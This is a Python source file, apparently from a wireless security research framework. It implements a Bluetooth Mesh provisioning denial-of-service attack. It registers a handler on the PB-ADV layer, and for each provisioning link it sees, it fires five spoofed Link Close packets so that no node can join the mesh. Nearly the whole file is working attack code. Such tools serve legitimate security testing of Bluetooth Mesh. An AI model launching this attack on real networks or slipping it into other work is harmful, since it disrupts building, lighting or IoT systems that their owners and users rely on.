"""
Attacker object for the Bluetooth Mesh link closer attack.
"""

import logging

from dataclasses import dataclass, field
from whad.btmesh.attacker import Attacker
from whad.btmesh.stack.pb_adv.link_closer import LinkCloserLayer

from whad.scapy.layers.btmesh import (
    EIR_PB_ADV_PDU,
    BTMesh_Generic_Provisioning_Link_Close,
    BTMesh_Generic_Provisioning_Hdr,
    EIR_Hdr,
)

from time import sleep
from random import uniform
from threading import Thread

logger = logging.getLogger(__name__)


@dataclass
class LinkCloserConfiguration:
    """Configuration for an the LinkCloser attack

    :param timeout: Timeout (sec) of the attack before quitting. Infinite if not specified (None).
    """

    timeout: int | None = None


class LinkCloserAttacker(Attacker):

    name = "LinkCloserAttack"
    description = "Reacts on Provisionning packets to close the link and deny the Provisionning of all nodes."
    need_provisioned_node = False

    def __init__(self, connector, configuration=LinkCloserConfiguration()):
        """LinkCloser Attacke object. Does not need a provisioned node's connector.

        :param connector: The btmesh connector to use
        :type connector: BTMesh
        :param configuration: The configuration to use
        :type configuration: LinkCloserConfiguration
        """

        super().__init__(connector, configuration)

        # List of the closed links (link_ids) provided by the LinkCloser layer
        self._link_closed = []

    @property
    def link_closed(self):
        return self._link_closed

    def _setup(self):
        """
        Setup the PB_ADV layer to have the LinkCloser layer instead
        """
        self._connector.stop()
        pb_adv = self._connector.prov_stack.get_layer("pb_adv")
        pb_adv.register_custom_handler(
            EIR_PB_ADV_PDU, self.on_pb_adv_pdu_handler
        )  # register our attack_callback in in PBAdv layer
        self._connector.start()
        self._is_setup = True

    def restore(self):
        """
        Restores the PB_ADV stack to normal
        """
        if self._is_setup:
            self._connector.stop()
            pb_adv = self._connector.prov_stack.get_layer("pb_adv")
            pb_adv.unregister_custom_hanlder(EIR_PB_ADV_PDU)
            self._connector.start()

    def _attack_runner(self):
        self._is_attack_running = True
        self.event.clear()
        self.event.wait(self._configuration.timeout)
        self._success = True
        self._is_attack_running = False

    def stop(self):
        """
        Stops the attack. The event is reversed (we wait for it to be set to stop)
        """
        self.event.set()

    def launch(self, asynch=True):
        """
        Launches the LinkCloser attack. asynch is advised

        :param asynch [TODO:type]: [TODO:description]
        """
        super().launch(asynch=asynch)

    def on_pb_adv_pdu_handler(self, message):
        """
        Handler when the PB_ADV receives a EIR_PB_ADV_PDU (so any PDU really)

        :param message: The packet received
        :type message: EIR_PB_ADV_PDU
        :returns: True to make the PB_ADV layer behave normally if the attack is not running, false otherwise
        :rtype: bool
        """
        if not self._is_attack_running:
            return True

        link_id = message.link_id
        if (
            isinstance(message[1], BTMesh_Generic_Provisioning_Hdr)
            and link_id not in self._link_closed
        ):
            Thread(target=self.send_link_clode_thread, args=[link_id]).start()
            return False

        return True

    def send_link_clode_thread(self, link_id):
        """
        Threat to send link close messages

        :param link_id [TODO:type]: [TODO:description]
        """
        for i in range(0, 5):
            self._connector.send_raw(
                EIR_Hdr(type=0x29)
                / EIR_PB_ADV_PDU(
                    link_id=link_id,
                    transaction_number=0x00,
                    data=BTMesh_Generic_Provisioning_Link_Close(reason=0x02),
                )
            )
            sleep(uniform(0.02, 0.05))

        self._link_closed.append(link_id)

    def show_result(self):
        """Function implemented in each Attacker to display the result of the attack"""
        print("Closed links are :")
        print(self._link_closed)
